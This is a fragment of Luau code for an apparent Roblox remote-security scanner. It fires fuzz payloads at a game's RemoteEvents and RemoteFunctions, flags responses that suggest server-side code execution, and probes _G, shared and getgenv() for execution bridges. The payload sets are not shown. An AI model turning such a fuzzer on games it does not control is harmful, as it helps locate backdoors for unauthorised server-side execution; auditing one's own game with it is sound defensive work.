local function addFuzzResult(path, payload, ok, response, riskDelta)
    local row=Instance.new("Frame"); row.Size=UDim2.new(1,-8,0,38); row.BorderSizePixel=0; row.Parent=FuzzResultList; corner(row,4)
    row.BackgroundColor3 = ok and Color3.fromRGB(12,24,14) or Color3.fromRGB(30,12,12)
    stroke(row, ok and Color3.fromRGB(20,80,30) or Color3.fromRGB(80,20,20),1)

    local ind=Instance.new("Frame"); ind.Size=UDim2.new(0,3,0.65,0); ind.Position=UDim2.new(0,0,0.175,0); ind.BackgroundColor3=ok and T.OK or T.CRIT; ind.BorderSizePixel=0; ind.Parent=row; corner(ind,2)

    local pl=lbl(row,path,11,T.TXT,Enum.Font.Code); pl.Size=UDim2.new(1,-10,0,14); pl.Position=UDim2.new(0,6,0,3)
    local py=lbl(row,"Payload: "..payload:sub(1,60),10,T.TXS,Enum.Font.Code); py.Size=UDim2.new(1,-10,0,12); py.Position=UDim2.new(0,6,0,18)
    local rs=lbl(row,(ok and "OK" or "FAIL").." → "..tostring(response):sub(1,80),10,ok and T.OK or T.CRIT,Enum.Font.Code); rs.Size=UDim2.new(1,-10,0,12); rs.Position=UDim2.new(0,6,1,-14)

    if riskDelta and riskDelta>0 then
        local rd=lbl(row,"⬆ Risk +"..riskDelta,10,T.CRIT,Enum.Font.GothamBold); rd.Size=UDim2.new(0,80,0,14); rd.Position=UDim2.new(1,-84,0,3); rd.TextXAlignment=Enum.TextXAlignment.Right
    end
end

local function runFuzzer()
    if S.isFuzzing then return end
    if #S.fuzzQueue==0 then log("WARN","Fuzz queue is empty. Add remotes from Scanner first."); return end
    S.isFuzzing=true
    FuzzResultList:ClearAllChildren(); ll(FuzzResultList,3)
    log("FUZZ",("Auto-Fuzzer started — %d remotes · mode: %s"):format(#S.fuzzQueue, currentFuzzMode))

    local payloads = CFG.FUZZ_SETS[currentFuzzMode] or CFG.FUZZ_SETS.QUICK

    for _, entry in ipairs(S.fuzzQueue) do
        if not S.isFuzzing then break end
        local remote = entry.inst
        if not remote or not remote.Parent then
            log("WARN","[FUZZ] Remote gone: "..entry.path); goto continue
        end

        log("FUZZ","Fuzzing: "..entry.path.." ("..entry.class..")")

        for _, payload in ipairs(payloads) do
            if not S.isFuzzing then break end
            task.wait(0.08) -- small delay to avoid rate limiting

            local ok, result, riskDelta = false, "", 0

            if remote:IsA("RemoteEvent") then
                ok, result = pcall(function()
                    remote:FireServer(payload)
                    return "Fired (no return)"
                end)
            elseif remote:IsA("RemoteFunction") then
                ok, result = pcall(function()
                    return tostring(remote:InvokeServer(payload))
                end)
            end

            result = tostring(result)

            -- Heuristic: does the response look like code executed?
            if result:find("SS%-FUZZ") or result:find("loadstring") or result:find("executed") then
                riskDelta = 35
                log("CRIT","[FUZZ] !! Possible execution response from "..entry.path..": "..result:sub(1,80))
            elseif result:find("error") or result:find("attempt") then
                riskDelta = 5 -- responded to the string, might be a live handler
            end

            -- Update entry risk
            entry.fuzzRisk = math.max(entry.fuzzRisk or 0, riskDelta)
            entry.risk = calcRemoteRisk(entry)

            S.fuzzResults[#S.fuzzResults+1]={path=entry.path,payload=payload,ok=ok,response=result,riskDelta=riskDelta}
            addFuzzResult(entry.path, payload, ok, result, riskDelta)

            log("FUZZ",("[%s] %s → %s"):format(ok and "OK" or "FAIL", entry.path, result:sub(1,60)))
        end

        ::continue::
    end

    updateStats()
    log("OK",("Fuzzer done — %d results logged"):format(#S.fuzzResults))
    S.isFuzzing=false
end

-- G-Bridge probe: checks _G, shared, and (if available) getgenv() for exec functions
local function probeGBridge()
    S.gbridgeFinds={}
    GBridgeList:ClearAllChildren(); ll(GBridgeList,2)
    log("FUZZ","G-Bridge probe starting…")

    local tables = { {name="_G", tbl=_G}, {name="shared", tbl=shared} }
    local ok, genv = pcall(getgenv)
    if ok and type(genv)=="table" then tables[#tables+1]={name="getgenv()",tbl=genv} end

    local found=0
    for _, src in ipairs(tables) do
        if type(src.tbl)~="table" then continue end
        for k, v in pairs(src.tbl) do
            local ks = tostring(k):lower()
            local isExecKey = false
            for _, bk in ipairs(CFG.GBRIDGE_KEYS) do
                if ks==bk or ks:find(bk,1,true) then isExecKey=true; break end
            end
            if isExecKey or type(v)=="function" and isExecKey then
                found+=1
                local entry={key=src.name.."."..tostring(k), valType=type(v), source=src.name}
                S.gbridgeFinds[#S.gbridgeFinds+1]=entry

                local row=Instance.new("Frame"); row.Size=UDim2.new(1,-8,0,22); row.BackgroundColor3=Color3.fromRGB(25,10,40); row.BorderSizePixel=0; row.Parent=GBridgeList; corner(row,3); stroke(row,T.PRP,1)
                local l=lbl(row,("[%s] %s  =  %s"):format(entry.source,tostring(k),type(v)),11,T.PRP,Enum.Font.Code); l.Size=UDim2.new(1,-8,1,0); l.Position=UDim2.new(0,4,0,0)
                log("CRIT","[GBRIDGE] "..entry.source.."."..tostring(k).." = "..type(v).." ← POSSIBLE EXECUTION BRIDGE")
            end
        end
    end

    statLabels["gbridge"].Text=tostring(found)
    if found==0 then
        log("OK","G-Bridge probe: no execution bridges found in _G / shared / getgenv()")
        local row=Instance.new("Frame"); row.Size=UDim2.new(1,-8,0,22); row.BackgroundColor3=T.BG3; row.BorderSizePixel=0; row.Parent=GBridgeList; corner(row,3)
        lbl(row,"✅  No execution bridges detected in _G / shared / getgenv()",11,T.OK,Enum.Font.Gotham).Size=UDim2.new(1,-8,1,0)
    else
        log("CRIT","G-Bridge probe: "..found.." suspicious keys found!")
    end
end

